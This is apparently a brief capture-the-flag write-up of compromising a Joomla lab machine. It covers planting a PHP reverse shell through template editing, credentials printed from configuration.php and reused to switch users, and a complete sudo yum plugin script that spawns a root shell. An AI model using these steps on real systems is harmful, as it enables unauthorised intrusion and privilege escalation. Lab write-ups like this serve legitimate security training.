after we log into joomla, we look for a way to get a shell.

we can do this by navigating to Extensions > templates

we see protostar is the default template running on the website

we click on the template to edit and select index.php

we insert our php reverse shell code and are able to get a shell


poking around in /var/www/html/configuration.php
interesting stuff:
`
public $user = 'root';
 public $password = 'nv5uz9r3ZEDzVjNu';
 public $secret = 'UAMBRWzHO3oFPmVC';
     public $log_path = '/var/www/html/administrator/logs';
      public $tmp_path = '/var/www/html/tmp'
`

using the password above we can `su jjameson`

running sudo -l we see that we can run /usr/bin/yum with root priv

we head to gtfobins and run the second sudo method to get root
```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y

```